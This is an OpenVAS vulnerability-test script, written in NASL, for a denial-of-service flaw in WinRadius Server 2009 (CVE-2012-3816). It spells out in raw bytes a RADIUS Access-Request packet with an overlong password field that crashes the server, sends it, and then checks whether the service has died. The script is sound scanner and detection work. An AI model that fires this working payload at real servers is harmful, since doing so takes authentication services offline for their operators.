###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_winradius_server_access_request_dos_vuln.nasl 11580 2018-09-25 06:06:13Z cfischer $
#
# WinRadius Server Access Request Packet Parsing Denial of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902918");
  script_version("$Revision: 11580 $");
  script_cve_id("CVE-2012-3816");
  script_bugtraq_id(53702);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-09-25 08:06:13 +0200 (Tue, 25 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-06-29 15:19:56 +0530 (Fri, 29 Jun 2012)");
  script_name("WinRadius Server Access Request Packet Parsing Denial of Service Vulnerability");

  script_xref(name:"URL", value:"http://1337day.com/exploits/18385");
  script_xref(name:"URL", value:"http://secunia.com/advisories/49299");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/75890");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/113078/winradius-dos.txt");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2012-05/0135.html");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Denial of Service");
  script_dependencies("radius_detect.nasl");
  script_require_udp_ports("Services/udp/radius", 1812);

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause a
  denial of service.");
  script_tag(name:"affected", value:"WinRadius Server version 2009");
  script_tag(name:"insight", value:"The flaw is due to an error when parsing Access-Request packets
  and can be exploited to crash the server via specially crafted requests with a long password field.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running WinRadius Server and is prone to denial of
  service vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"exploit");

  exit(0);
}

include("network_func.inc");

port = get_kb_item("Services/udp/radius");
if(!port){
  exit(0);
}

if(!check_udp_port_status(dport:port)){
  exit(0);
}

if(!is_radius_alive(port:port)){
  exit(0);
}

soc = open_sock_udp(port);
if (!soc){
  exit(0);
}

req = raw_string(0x01,              ## Code: Access-Request (1)
                 0x47,              ## Packet identifier: 0x47 (71)
                 0x01, 0x1e,        ## Length: 286

                 ## Authenticator: 7DD2C61BBE7E9D582F5EB3BD9A68F127
                 0x7d, 0xd2, 0xc6, 0x1b, 0xbe, 0x7e, 0x9d, 0x58, 0x2f,
                 0x5e, 0xb3, 0xbd, 0x9a, 0x68, 0xf1, 0x27,

                  ## AVP: l=5  t=User-Name(1): 005
                 0x01, 0x05, 0x30, 0x30, 0x35,

                 ## AVP: l=255  t=User-Password(2): Encrypted
                 0x02, 0xff, 0x4a, 0xbb, 0xa8, 0x29, 0xbd, 0xdc, 0x2d, 0x5d,
                 0x59, 0x86, 0xe3, 0xc7, 0x51, 0x0f, 0x99, 0x7e, 0x3f, 0x0c,
                 0xfc, 0xe5, 0x30, 0xb3, 0x68, 0xa4, 0x5b, 0x3d, 0xeb, 0x3c,
                 0x40, 0xaa, 0x93, 0xd3, 0xb4, 0x74, 0xa9, 0xa3, 0x41, 0x50,
                 0x47, 0x1e, 0xf6, 0x93, 0xc3, 0x84, 0xba, 0x46, 0x46, 0xc0,
                 0x53, 0xf5, 0x9a, 0x27, 0x9b, 0x3b, 0x3d, 0x9c, 0xc7, 0x5f,
                 0xb9, 0x72, 0x99, 0x0f, 0x15, 0xea, 0x39, 0x6b, 0x6b, 0x17,
                 0xe6, 0xe2, 0x5a, 0x1c, 0x58, 0x82, 0xf6, 0x4f, 0x78, 0x3a,
                 0x4f, 0x35, 0x93, 0xc1, 0x11, 0x3f, 0x8f, 0xf0, 0xf0, 0x07,
                 0xe3, 0xc5, 0xf5, 0xc6, 0x2c, 0xf0, 0x49, 0x17, 0x7f, 0x50,
                 0x52, 0x78, 0xf8, 0x8b, 0x68, 0x0b, 0x60, 0x4e, 0x7d, 0xfa,
                 0xd1, 0x8e, 0xb2, 0xa2, 0x70, 0x83, 0xfb, 0x4c, 0xb0, 0x59,
                 0x38, 0x47, 0xc9, 0xf0, 0x69, 0xfb, 0x67, 0xe5, 0x2b, 0xc4,
                 0xac, 0x66, 0xbf, 0xc1, 0x97, 0x47, 0x7f, 0xcb, 0x04, 0x93,
                 0x34, 0x9b, 0x62, 0x3b, 0x60, 0x95, 0x87, 0x65, 0x73, 0x17,
                 0xb1, 0x9b, 0x37, 0xd4, 0xcd, 0x59, 0x8a, 0xd0, 0x0c, 0x22,
                 0xe0, 0x3f, 0xce, 0xb6, 0x66, 0x49, 0x1c, 0x0a, 0xa2, 0xd8,
                 0x1f, 0x07, 0x30, 0x27, 0x78, 0xcc, 0x5a, 0xb6, 0xaf, 0x69,
                 0x35, 0x92, 0xd8, 0xd1, 0xfa, 0x79, 0x34, 0x1c, 0xf3, 0x6b,
                 0xd8, 0xad, 0xac, 0x18, 0x3c, 0x33, 0xef, 0x91, 0xf7, 0x1d,
                 0x2a, 0x5b, 0x2b, 0xfe, 0xb2, 0xe7, 0xee, 0xe0, 0xc8, 0x5d,
                 0xec, 0x29, 0x1b, 0xe2, 0x9b, 0x5e, 0x5b, 0xaa, 0xc7, 0xce,
                 0xf5, 0xd6, 0xc9, 0x81, 0x7c, 0x9e, 0x2b, 0xba, 0x00, 0x0f,
                 0xd9, 0x95, 0x95, 0x7a, 0xc1, 0x09, 0x84, 0xd1, 0x32, 0xea,
                 0x11, 0xf9, 0xe3, 0x6d, 0x07, 0xf2, 0xea, 0x0a, 0x05, 0x05,
                 0x49, 0xd2, 0x58, 0xaa, 0x95);
                 ## AVP: l=6  t=NAS-IP-Address(4):Not mandatory
                 #0x04, 0x06, 0xc0, 0xa8, 0x01, 0x1c);

send(socket:soc, data:req);
close(soc);

if(!is_radius_alive(port:port)){
  security_message(port:port);
  exit(0);
}

exit(99);